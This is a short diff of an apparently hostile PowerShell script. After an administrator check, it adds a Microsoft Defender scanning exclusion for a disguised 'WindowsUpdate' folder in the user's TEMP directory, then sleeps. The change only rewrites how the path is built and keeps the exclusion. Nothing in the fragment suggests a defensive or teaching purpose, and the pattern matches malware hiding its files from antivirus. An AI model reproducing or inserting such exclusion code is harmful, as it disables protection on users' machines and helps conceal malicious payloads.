@@ -13,5 +13,7 @@ if (-not $isAdmin) {
     exit
 
 }
-Add-MpPreference -ExclusionPath "$env:TEMP\WindowsUpdate"
+$path = Join-Path $env:TEMP "WindowsUpdate"
+Add-MpPreference -ExclusionPath $path
+
 Start-Sleep -Seconds 10
